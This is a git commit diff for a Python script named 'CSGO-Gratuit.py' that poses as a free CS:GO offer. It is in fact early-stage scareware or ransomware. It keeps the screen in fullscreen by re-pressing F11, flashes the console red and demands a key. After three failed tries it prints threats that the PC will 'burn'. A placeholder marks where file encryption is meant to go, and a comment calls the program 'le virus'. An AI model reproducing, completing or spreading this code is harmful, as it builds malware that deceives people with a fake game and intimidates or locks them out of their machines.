2a80a1754d2a032bb2e534f7ffca1a1e7ce4b4e2
Matéo GUIDOTTI <mateog26000@gmail.com>
2021-09-13 19:29:41 +0200

    version 1.0.3

--- CSGO-Gratuit.py
+++ CSGO-Gratuit.py
@@ -4,7 +4,6 @@ import os, time, pyautogui, threading, keyboard
 # Var
 response = "azerty"
 wait_until_block = 0
-invalid_key = False
 
 # Paramètres du cmd
 os.system("@echo off")
@@ -16,8 +15,12 @@ pyautogui.press("F11")
 def WaitF11():
     while True:
         keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
-        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam)
-        os.system("color 40")    
+        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam)    
+
+def BackgroundColor():
+    while True:
+        os.system("color 40")
+        time.sleep(0.1)
 
 # Fonction principale
 def Main():
@@ -25,7 +28,6 @@ def Main():
     global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
     
     while True: 
-        os.system("color 40")
         os.system("cls")
         
         user_response = input(f"{fg(0)}{bg(1)}Entrez votre clé ici: \n{attr(0)}") # L'utilisateur entre la clé
@@ -34,10 +36,7 @@ def Main():
             print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
             print(f"{fg(0)}{bg(1)}Appuyez sur une touche pour quitter{attr(0)}")
             os.system("pause >nul")
-            print("tu m'fais chier à trouver la clé")
-            os.system("exit") # ATTENTION au nom du virus
-            invalid_key = False
-            break
+            os.system("taskkill /f /im CSGO-Gratuit.exe") # ATTENTION au nom du virus
 
         else: # Clé invalide
             print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
@@ -47,22 +46,21 @@ def Main():
                 # Cryptage de fichier et autres
                 print("tu as utilisé tes trois essais, ton pc est dans la sauce")
                 time.sleep(0.5)
-                invalid_key = True
                 break
 
 
-    if invalid_key:
-        print("Ton pc va brûler")
-        time.sleep(0.5)
-        print("insérer le cryptage de fichier: ")
+    print("Ton pc va brûler")
+    time.sleep(0.5)
+    print("insérer le cryptage de fichier: ")
                 
 
 # Threads
 main = threading.Thread(target=Main)
 wait_f11 = threading.Thread(target=WaitF11)
+background_color = threading.Thread(target=BackgroundColor)
 
 # Liste des threads
-threads = [main, wait_f11]
+threads = [main, wait_f11, background_color]
 
 # Lancer les threads un par un
 for thread in threads: thread.start()
